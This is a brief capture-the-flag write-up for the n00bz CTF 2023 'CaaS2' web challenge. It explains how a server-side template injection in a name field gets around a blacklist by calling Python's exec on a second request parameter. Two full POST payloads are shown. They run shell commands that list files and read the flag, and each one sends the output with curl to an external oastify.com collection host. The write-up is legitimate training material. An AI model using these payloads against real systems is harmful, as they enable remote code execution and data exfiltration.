In this challenge (web/CaaS2) we have name and team_name fields, which render the page without any filter. Thus, we can inject (SSTI) in the name field. We also have a character/word blacklist and a length limit. Therefore, to bypass this, we can use another controlled field and use built-in functions to execute commands. 


For listing files, determine flag file name

```
POST /generate?cs=import+os;os.system("ls+-la+>+/tmp/out.txt");os.system("curl+https://5ouy47kzntvqhqplm0q8du4qdhj77w.oastify.com/+-d+@/tmp/out.txt")
name={{request.__repr__.__builtins__.exec(request.values["cs"])}}&team_name=cyberspace
```


For reading flag:
```
POST /generate?cs=import+os;os.system("cat+s3cur3_fl4g_f1l3_.txt+>+/tmp/out.txt");os.system("curl+https://5ouy47kzntvqhqplm0q8du4qdhj77w.oastify.com/+-d+@/tmp/out.txt")

name={{request.__repr__.__builtins__.exec(request.values["cs"])}}&team_name=cyberspace
```
![image](https://github.com/RJCyber1/n00bz-ctf-2023-writeups/assets/86359182/a832b24f-2551-4b6d-985b-8debb50e21f6)
![image](https://github.com/RJCyber1/n00bz-ctf-2023-writeups/assets/86359182/389d3a0c-99c9-4d44-ae56-a0a82c0079c4)
